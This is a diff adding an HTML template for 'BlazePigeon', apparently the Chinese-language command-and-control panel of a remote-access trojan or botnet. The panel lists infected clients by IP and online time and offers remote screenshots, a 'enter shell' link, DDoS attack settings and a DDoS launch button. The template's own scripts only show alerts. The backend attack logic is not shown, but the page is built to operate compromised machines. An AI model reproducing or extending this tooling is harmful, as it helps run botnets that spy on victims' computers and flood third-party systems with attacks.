@@ -1,0 +1,216 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<link rel="shortcut icon" href="assets/images/favicon.svg" type="image/x-icon" />
+		<title>BlazePigeon控制面板</title>
+
+		<!-- ========== All CSS files linkup ========= -->
+		<link rel="stylesheet" href="/static/css/bootstrap.min.css" />
+		<link rel="stylesheet" href="/static/css/lineicons.css" />
+		<link rel="stylesheet" href="/static/css/bubble.css" />
+		<link rel="stylesheet" href="/static/css/snow.css" />
+		<link rel="stylesheet" href="/static/css/fullcalendar.css" />
+		<link rel="stylesheet" href="/static/css/morris.css" />
+		<link rel="stylesheet" href="/static/css/vanilla-datatables.min.css" />
+		<link rel="stylesheet" href="/static/css/loading-bar.min.css" />
+		<link rel="stylesheet" href="/static/css/main.css" />
+
+		<style>
+			body {
+				background-color: #222;
+			}
+		</style>
+	</head>
+	<body>
+		<!-- ======== sidebar-nav start =========== -->
+		<aside class="sidebar-nav-wrapper" style="background-color: #0d0821;">
+			<div class="navbar-logo">
+				<a href="/index/">
+					<img class="img-fluid" src="/static/picture/blaze.png" alt="logo" />
+				</a>
+			</div>
+			<nav class="sidebar-nav">
+				<ul>
+					<li class="nav-item active">
+						<a href="/index/">
+							<span class="icon">
+								<svg width="22" height="22" viewBox="0 0 22 22">
+								</svg>
+							</span>
+							<span class="text">首页</span>
+						</a>
+					</li>
+					<li class="nav-item">
+						<a href="/client_setting/">
+							<span class="icon">
+								<svg width="22" height="22" viewBox="0 0 22 22">
+								</svg>
+							</span>
+							<span class="text">客户端设置</span>
+						</a>
+					</li>
+					<li class="nav-item">
+						<a href="/ddos_setting_index/">
+							<span class="icon">
+								<svg width="22" height="22" viewBox="0 0 22 22">
+								</svg>
+							</span>
+							<span class="text">ddos攻击设置</span>
+						</a>
+					</li>
+					<li class="nav-item">
+						<a href="/picture/">
+							<span class="icon">
+								<svg width="22" height="22" viewBox="0 0 22 22">
+								</svg>
+							</span>
+							<span class="text">截图查看</span>
+						</a>
+					</li>
+				</ul>
+			</nav>
+		</aside>
+		<div class="overlay"></div>
+		<!-- ======== sidebar-nav end =========== -->
+
+		<!-- ======== main-wrapper start =========== -->
+		<main class="main-wrapper">
+			<section>
+				<div class="container-fluid">
+					<!-- ========== title-wrapper start ========== -->
+					<div class="title-wrapper pt-30">
+						<div class="row align-items-center">
+							<div class="">
+								<div class="title d-flex align-items-center flex-wrap mb-30">
+									<h2 class="mr-40" style="color: wheat">客户端列表</h2>
+									<a href="/start/" class="main-btn primary-btn btn-hover btn-sm" onclick="start()">
+										<i class="lni lni-plus mr-5"></i>开启服务</a>
+									<a href="/sessions/" class="main-btn primary-btn btn-hover btn-sm"
+										onclick="sessions()">
+										<i class="lni lni-plus mr-5"></i>检测在线</a>
+									<a href="/exit/" class="main-btn primary-btn btn-hover btn-sm" onclick="exit()">
+										<i class="lni lni-plus mr-5"></i>停止服务</a>
+									<a href="/ddos/" class="main-btn primary-btn btn-hover btn-sm" onclick="ddos()">
+										<i class="lni lni-plus mr-5"></i>ddos攻击</a>
+								</div>
+							</div>
+						</div>
+					</div>
+					<!-- ========== title-wrapper end ========== -->
+
+					<!-- Project Wrapper Start -->
+					<div class="projects-wrapper">
+						<div class="row">
+							{% for client in client_data %}
+							<div class="col-lg-4 col-md-6">
+								<div class="card-style project-card mb-30" style="background-color: lightgrey">
+									<div class="
+                      title
+                      mb-10
+                      d-flex
+                      justify-content-between
+                      align-items-center
+                    ">
+										<h6 class="mb-10">{{ client.username }}</h6>
+										<div class="more-btn-wrapper">
+											<button class="more-btn dropdown-toggle" id="moreAction"
+												data-bs-toggle="dropdown" aria-expanded="false">
+												<i class="lni lni-more-alt"></i>
+											</button>
+											<ul class="dropdown-menu dropdown-menu-end" aria-labelledby="moreAction" style="background-color: lightblue">
+												<li class="dropdown-item">
+													<a href="" class="text-gray">进入shell</a>
+												</li>
+												<li class="dropdown-item">
+													<a href="/screen/{{ client.ip }}/" class="text-gray">截图</a>
+												</li>
+											</ul>
+										</div>
+									</div>
+									<div class="card-body">
+										<div class="chart-wrapper">
+											<div class="mb-25">
+												<span class="status-btn primary-btn">{{ client.status }}</span>
+											</div>
+										</div>
+										<div class="content">
+											<h5 class="text-medium mb-10">IP:{{ client.ip}}</h5>
+											<p class="text-sm">上线时间:{{ client.online_time }}</p>
+										</div>
+									</div>
+								</div>
+								<!-- End Card -->
+							</div>
+							{% endfor %}
+							<!-- End Col -->
+
+						</div>
+						<!-- End Row -->
+					</div>
+					<!-- Project Wrapper End -->
+				</div>
+				<!-- end container -->
+			</section>
+
+			<footer class="footer">
+				<div class="container-fluid">
+					<div class="row">
+						<div class="col-md-6 order-last order-md-first">
+							<div class="copyright text-center text-md-start">
+								<p class="text-sm">
+									Designed and Developed by
+									<a href="" rel="nofollow">
+										Blaze Pigeon
+									</a>
+								</p>
+							</div>
+						</div>
+						<!-- end col-->
+
+					</div>
+					<!-- end row -->
+				</div>
+				<!-- end container -->
+			</footer>
+
+		</main>
+
+		<div class="option-overlay"></div>
+
+
+		<script src="/static/js/bootstrap.bundle.min.js"></script>
+		<script src="/static/js/chart.min.js"></script>
+		<script src="/static/js/apexcharts.min.js"></script>
+		<script src="/static/js/dynamic-pie-chart.js"></script>
+		<script src="/static/js/moment.min.js"></script>
+		<script src="/static/js/fullcalendar.js"></script>
+		<script src="/static/js/jvectormap.min.js"></script>
+		<script src="/static/js/world-merc.js"></script>
+		<script src="/static/js/polyfill.js"></script>
+		<script src="/static/js/quill.min.js"></script>
+		<script src="/static/js/vanilla-datatables.min.js"></script>
+		<script src="/static/js/loading-bar.min.js"></script>
+		<script src="/static/js/main.js"></script>
+
+		<script>
+			function start() {
+				window.alert("开启成功")
+			}
+
+			function sessions() {
+				window.alert("检测成功")
+			}
+
+			function exit() {
+				window.alert("退出成功")
+			}
+
+			function ddos() {
+				window.alert("正在攻击")
+			}
+		</script>
+	</body>
+</html>
